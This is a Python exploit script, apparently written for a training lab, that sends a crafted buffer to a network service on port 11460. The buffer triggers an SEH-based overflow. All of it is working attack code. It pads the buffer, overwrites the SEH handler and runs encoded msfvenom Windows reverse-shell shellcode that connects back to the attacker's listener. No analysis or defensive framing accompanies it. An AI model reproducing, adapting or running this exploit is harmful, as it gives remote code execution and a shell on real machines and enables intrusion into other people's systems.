import socket
import sys
import struct


def generate_agent_command_header():
    ps_agent_command_header = b""
    n = 12

    for i in range(1, n + 1):
        val = 0x40 + i
        if val == 0x44:
            ps_agent_command_header += struct.pack("<i", 4674)
        elif val == 0x45:
            ps_agent_command_header += struct.pack("<i", 0x00)
        elif val == 0x46:
            ps_agent_command_header += struct.pack("<i", 0x1000)
        elif val == 0x47:
            ps_agent_command_header += struct.pack("<i", 0x00)
        elif val == 0x48:
            ps_agent_command_header += struct.pack("<i", 0x1000)
        elif val == 0x49:
            ps_agent_command_header += struct.pack("<i", -0x11000)
        elif val == 0x4a:
            ps_agent_command_header += struct.pack("<i", 0x153fc)
        else:
            ps_agent_command_header += bytes([val]) * 4

    return ps_agent_command_header


# ┌──(snowcrash㉿ratbox)-[~]
# └─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.5 LPORT=4444 EXITFUNC=seh -e x86/shikata_ga_nai -f python
def generate_shellcode():
    shellcode = b""
    shellcode += b"\xda\xc8\xbf\xf2\x6c\x60\x62\xd9\x74\x24\xf4\x5d"
    shellcode += b"\x33\xc9\xb1\x52\x31\x7d\x17\x83\xed\xfc\x03\x8f"
    shellcode += b"\x7f\x82\x97\x93\x68\xc0\x58\x6b\x69\xa5\xd1\x8e"
    shellcode += b"\x58\xe5\x86\xdb\xcb\xd5\xcd\x89\xe7\x9e\x80\x39"
    shellcode += b"\x73\xd2\x0c\x4e\x34\x59\x6b\x61\xc5\xf2\x4f\xe0"
    shellcode += b"\x45\x09\x9c\xc2\x74\xc2\xd1\x03\xb0\x3f\x1b\x51"
    shellcode += b"\x69\x4b\x8e\x45\x1e\x01\x13\xee\x6c\x87\x13\x13"
    shellcode += b"\x24\xa6\x32\x82\x3e\xf1\x94\x25\x92\x89\x9c\x3d"
    shellcode += b"\xf7\xb4\x57\xb6\xc3\x43\x66\x1e\x1a\xab\xc5\x5f"
    shellcode += b"\x92\x5e\x17\x98\x15\x81\x62\xd0\x65\x3c\x75\x27"
    shellcode += b"\x17\x9a\xf0\xb3\xbf\x69\xa2\x1f\x41\xbd\x35\xd4"
    shellcode += b"\x4d\x0a\x31\xb2\x51\x8d\x96\xc9\x6e\x06\x19\x1d"
    shellcode += b"\xe7\x5c\x3e\xb9\xa3\x07\x5f\x98\x09\xe9\x60\xfa"
    shellcode += b"\xf1\x56\xc5\x71\x1f\x82\x74\xd8\x48\x67\xb5\xe2"
    shellcode += b"\x88\xef\xce\x91\xba\xb0\x64\x3d\xf7\x39\xa3\xba"
    shellcode += b"\xf8\x13\x13\x54\x07\x9c\x64\x7d\xcc\xc8\x34\x15"
    shellcode += b"\xe5\x70\xdf\xe5\x0a\xa5\x70\xb5\xa4\x16\x31\x65"
    shellcode += b"\x05\xc7\xd9\x6f\x8a\x38\xf9\x90\x40\x51\x90\x6b"
    shellcode += b"\x03\x9e\xcd\x5e\xd6\x76\x0c\xa0\xc9\xda\x99\x46"
    shellcode += b"\x83\xf2\xcf\xd1\x3c\x6a\x4a\xa9\xdd\x73\x40\xd4"
    shellcode += b"\xde\xf8\x67\x29\x90\x08\x0d\x39\x45\xf9\x58\x63"
    shellcode += b"\xc0\x06\x77\x0b\x8e\x95\x1c\xcb\xd9\x85\x8a\x9c"
    shellcode += b"\x8e\x78\xc3\x48\x23\x22\x7d\x6e\xbe\xb2\x46\x2a"
    shellcode += b"\x65\x07\x48\xb3\xe8\x33\x6e\xa3\x34\xbb\x2a\x97"
    shellcode += b"\xe8\xea\xe4\x41\x4f\x45\x47\x3b\x19\x3a\x01\xab"
    shellcode += b"\xdc\x70\x92\xad\xe0\x5c\x64\x51\x50\x09\x31\x6e"
    shellcode += b"\x5d\xdd\xb5\x17\x83\x7d\x39\xc2\x07\x83\xcb\xde"
    shellcode += b"\x9d\x14\x72\x8b\xdf\x78\x85\x66\x23\x85\x06\x82"
    shellcode += b"\xdc\x72\x16\xe7\xd9\x3f\x90\x14\x90\x50\x75\x1a"
    shellcode += b"\x07\x50\x5c"
    return shellcode


shellcode = generate_shellcode()

opcode = 0xE9
displacement = -0x405
packed_displacement = struct.pack("<i", displacement)
ps_agent_jump_shellcode = bytes([opcode]) + packed_displacement
ps_agent_command_memcpy_pad = b"\x90" * ((0x151c + (156 - 8)) - 0x400)
ps_agent_command_memcpy_pad += shellcode
ps_agent_command_memcpy_pad += b"\x90" * (0x400 - len(shellcode))
ps_agent_command_memcpy_pad += ps_agent_jump_shellcode
ps_agent_command_memcpy_pad += b"\x90" * 3
ps_agent_nseh = struct.pack(">I", 0xebf69090)
ps_agent_eip = struct.pack("<i", 0x0066cf5a)
sz_tail_pad = 0x4400 - (len(ps_agent_command_memcpy_pad) + 0x10 +
                        len(ps_agent_command_memcpy_pad) + 4 + len(ps_agent_eip))
ps_agent_tail_pad = b"\x90" * sz_tail_pad
ps_agent_command = ps_agent_command_memcpy_pad + \
    ps_agent_nseh + ps_agent_eip + ps_agent_tail_pad
sz_buffer = struct.pack(">I", len(ps_agent_command) + 4)
ps_command_buffer = sz_buffer + generate_agent_command_header() + ps_agent_command


def main():
    server = "192.168.196.10"
    port = 11460

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    s.send(ps_command_buffer)
    s.close()

    print("[+] Packet sent")
    sys.exit(0)


if __name__ == "__main__":
    main()
